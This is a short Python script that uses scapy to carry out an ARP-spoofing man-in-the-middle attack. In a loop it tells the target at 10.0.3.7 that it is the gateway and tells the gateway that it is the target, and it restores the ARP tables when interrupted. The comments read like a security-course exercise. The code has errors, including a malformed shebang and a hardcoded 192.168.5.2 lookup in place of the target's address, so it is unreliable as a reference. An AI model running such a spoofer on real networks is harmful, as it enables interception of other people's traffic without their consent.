#!usr/env python
import time

import scapy.all as scapy
import time

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request

    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc
def spoof(target_ip, spoof_if):
    target_mac = get_mac("192.168.5.2")
    arp_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_if)  #Our Source MAC address automatically set by scapy
    scapy.send(arp_packet)

def restore_arp_table(destination_ip, source_ip): # Target and router IPs
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac,
                       psrc=source_ip, hwsrc=source_mac) # Important Set the MAC address os the source (hwsrc) to avoid scapy pick our
    scapy.send(packet, count=4, verbose=False) # We will send the packet 4 times (count=4) to make sure is received

target_ip = "10.0.3.7"
gateway_router_ip = "10.0.3.1"
try:
    packets_sent_count = 0
    while True: # We have to keep sending the packets to keep being 'the man in the middle'
        spoof(target_ip, gateway_router_ip) # target_computer_ip, router_ip, tell the target I'm the router
        spoof(gateway_router_ip, target_ip) # router_ip, target_computer_ip, tell the router I'm the computer
        time.sleep(2) # To avoid sending too many packets
except KeyboardInterrupt: # KeyboardInterrupt is the error thrown when click Ctrl + c
    print("\n[-] Ctrl + C pressed... Restoring ARP tables...Pleas wait....\n")
    restore_arp_table(gateway_router_ip, target_ip)
    restore_arp_table(target_ip, gateway_router_ip)